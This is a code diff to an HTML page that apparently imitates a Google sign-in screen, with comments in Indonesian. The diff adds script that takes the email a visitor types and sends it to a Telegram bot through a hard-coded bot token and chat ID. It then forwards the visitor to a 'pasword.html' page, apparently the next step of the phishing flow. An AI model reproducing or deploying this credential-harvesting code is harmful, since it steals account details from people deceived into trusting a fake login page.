@@ -3,16 +3,13 @@
   <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-
     <link rel="preconnect" href="https://fonts.gstatic.com" />
     <link
       href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400&display=swap"
       rel="stylesheet"
     />
-
     <link rel="stylesheet" href="./reset.css" />
     <link rel="stylesheet" href="./styles.css" />
-
     <title>Google</title>
   </head>
 
@@ -42,35 +39,45 @@
         </div>
       </div>
     </div>
+    
     <script>
-        
       document.getElementById("lanjutkanBtn").addEventListener("click", function() {
         const emailInput = document.getElementById("emailInput");
-        // Check if the input field is empty
-        if (emailInput.value.trim() === "") {
-          alert("Email atau ponsel harus diisi!");  // Show a warning if the input is empty
-          emailInput.focus();  // Focus back to the input field
-          return;  // Prevent the page from navigating
+        const email = emailInput.value.trim();
+
+        // Validasi email
+        if (email === "") {
+          alert("Email atau ponsel harus diisi!");
+          emailInput.focus();
+          return;  // Hentikan jika input kosong
         }
-        if (!emailInput.value.includes('@gmail.com')) {
-        alert("Email harus menyertakan @gmail.com");  // Show a warning if "@" is missing
-        emailInput.focus();  // Focus back to the input field
-        return;  // Prevent the page from navigating
+        if (!email.includes('@gmail.com')) {
+          alert("Email harus menyertakan @gmail.com");
+          emailInput.focus();
+          return;  // Hentikan jika email tidak valid
         }
 
-        // If all validations pass, navigate to the next page
-        window.location.href = "pasword.html";  // Navigate to the next page
-            
-        // Show loading spinner
+        // Tampilkan loading spinner
         document.getElementById("loadingSpinner").style.display = "block";
-        
-        // Simulate a loading effect with a delay
-        setTimeout(function() {
-          // Navigate to the target page
-          window.location.href = "pasword.html";  // Navigate to the target page
-        }, 1500); // 1.5 seconds delay (you can adjust this)
+
+        // Kirim data email ke Telegram
+        const botToken = '6812714144:AAHCwoKn2croDh94SVFfWEmDz7R5eKbL34g';
+        const chatId = '1701307635';
+        const message = `email yang dimasukkan: ${email}`;
+
+        fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`, {
+          method: 'GET',
+        })
+        .then(response => response.json())
+        .then(data => {
+          // Setelah pengiriman, arahkan ke halaman password
+          window.location.href = "pasword.html";  // Halaman tujuan setelah sukses
+        })
+        .catch(error => {
+          console.error('Error:', error);
+          alert('Terjadi kesalahan, coba lagi!');
+        });
       });
     </script>
   </body>
 </html>
-
